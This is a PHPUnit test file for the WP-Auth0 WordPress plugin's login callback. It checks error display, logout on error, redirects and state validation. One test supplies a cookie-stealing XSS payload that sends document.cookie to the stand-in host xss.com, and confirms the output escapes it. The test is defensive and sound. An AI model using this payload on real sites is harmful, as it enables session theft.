<?php
/**
 * Contains Class TestLoginManagerInitAuth0.
 *
 * @package WP-Auth0
 *
 * @since 3.10.0
 */

/**
 * Class TestLoginManagerInitAuth0.
 * Test the WP_Auth0_LoginManager::init_auth0() method.
 */
class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {

	use DomDocumentHelpers;

	use RedirectHelpers;

	use UsersHelper;

	use WpDieHelper;

	/**
	 * WP_Auth0_LoginManager instance to test.
	 *
	 * @var WP_Auth0_LoginManager
	 */
	protected $login;

	/**
	 * Runs before each test method.
	 */
	public function setUp() {
		parent::setUp();
		$this->login = new WP_Auth0_LoginManager( new WP_Auth0_UsersRepo( self::$opts ), self::$opts );
	}

	/**
	 * Test that Auth0 is not initialized if the plugin is not ready or if the callback URL is not correct.
	 */
	public function testThatNothingHappensIfNotReady() {
		$this->startWpDieHalting();
		$this->assertFalse( wp_auth0_process_auth_callback() );
		$_REQUEST['auth0'] = 1;
		$this->assertFalse( wp_auth0_process_auth_callback() );
		self::auth0Ready( true );
		unset( $_REQUEST['auth0'] );
		$this->assertFalse( wp_auth0_process_auth_callback() );

		$output = '';
		try {
			$_REQUEST['auth0'] = 1;
			wp_auth0_process_auth_callback();
		} catch ( Exception $e ) {
			$output = $e->getMessage();
		}

		$this->assertNotEmpty( $output );
	}

	/**
	 * Test that an error in the URL parameter stops the callback with an error.
	 */
	public function testThatErrorInUrlStopsCallback() {
		$this->startWpDieHalting();

		self::$opts->set( 'domain', 'test.auth0.com' );
		self::$opts->set( 'client_id', '__test_client_id__' );
		self::$opts->set( 'client_secret', uniqid() );
		$_REQUEST['auth0']             = 1;
		$_REQUEST['error']             = '__test_error_code__';
		$_REQUEST['error_description'] = '__test_error_description__';

		$output = '';
		try {
			wp_auth0_process_auth_callback();
		} catch ( Exception $e ) {
			$output = $e->getMessage();
		}

		$this->assertContains( 'There was a problem with your log in', $output );
		$this->assertContains( '__test_error_description__', $output );
		$this->assertContains( 'error code', $output );
		$this->assertContains( '__test_error_code__', $output );
		$this->assertContains( '<a href="https://test.auth0.com/v2/logout?client_id=__test_client_id__', $output );
	}

	/**
	 * Test that an error in the URL parameter logs the current user out.
	 */
	public function testThatErrorInUrlLogsUserOut() {
		$this->startWpDieHalting();

		self::auth0Ready();
		$_REQUEST['auth0']             = 1;
		$_REQUEST['error']             = uniqid();
		$_REQUEST['error_description'] = uniqid();
		$this->setGlobalUser();

		try {
			wp_auth0_process_auth_callback();
		} catch ( Exception $e ) {
			// Just need to call the above ...
		}

		$this->assertFalse( is_user_logged_in() );
	}

	/**
	 * Test that an error in the URL parameter does not allow XSS.
	 */
	public function testThatErrorInUrlAvoidsXss() {
		$this->startWpDieHalting();

		self::auth0Ready();
		$_REQUEST['auth0']             = 1;
		$_REQUEST['error']             = '<script>window.location="xss.com?cookie="+document.cookie</script>';
		$_REQUEST['error_description'] = '<script>window.location="xss.com?cookie="+document.cookie</script>';

		$output = '';
		try {
			wp_auth0_process_auth_callback();
		} catch ( Exception $e ) {
			$output = $e->getMessage();
		}

		$this->assertNotContains( '<script>', $output );
	}

	/**
	 * Test that a logged-in user is redirected from the callback without any processing.
	 */
	public function testThatLoggedInUserIsRedirected() {
		$this->startWpDieHalting();

		$this->startRedirectHalting();
		$_REQUEST['auth0'] = 1;
		self::auth0Ready();
		$this->setGlobalUser();

		$caught_redirect = [];
		try {
			wp_auth0_process_auth_callback();
		} catch ( Exception $e ) {
			$caught_redirect = unserialize( $e->getMessage() );
		}

		$this->assertEquals( self::$opts->get( 'default_login_redirection' ), $caught_redirect['location'] );
	}

	/**
	 * Test that missing state stops the callback with an error.
	 */
	public function testThatMissingStateStopsCallback() {
		$this->startWpDieHalting();

		self::$opts->set( 'domain', 'test.auth0.com' );
		self::$opts->set( 'client_id', '__test_client_id__' );
		self::$opts->set( 'client_secret', uniqid() );
		$_REQUEST['auth0'] = 1;

		$output = '';
		try {
			wp_auth0_process_auth_callback();
		} catch ( Exception $e ) {
			$output = $e->getMessage();
		}

		$this->assertContains( 'There was a problem with your log in', $output );
		$this->assertContains( 'Missing state', $output );
		$this->assertContains( 'error code', $output );
		$this->assertContains( 'unknown', $output );
		$this->assertContains( '<a href="https://test.auth0.com/v2/logout?client_id=__test_client_id__', $output );
	}

	/**
	 * Test that missing state stops the callback with an error.
	 */
	public function testThatInvalidStateStopsCallback() {
		$this->startWpDieHalting();

		self::$opts->set( 'domain', 'test.auth0.com' );
		self::$opts->set( 'client_id', '__test_client_id__' );
		self::$opts->set( 'client_secret', uniqid() );
		$_REQUEST['auth0'] = 1;
		$_GET['state']     = '__invalid_state__';

		$output = '';
		try {
			// Need to suppress header warning for cookie setting.
			// phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged
			@wp_auth0_process_auth_callback();
		} catch ( Exception $e ) {
			$output = $e->getMessage();
		}

		$this->assertContains( 'There was a problem with your log in', $output );
		$this->assertContains( 'Invalid state', $output );
		$this->assertContains( 'error code', $output );
		$this->assertContains( 'unknown', $output );
		$this->assertContains( '<a href="https://test.auth0.com/v2/logout?client_id=__test_client_id__', $output );
	}
}
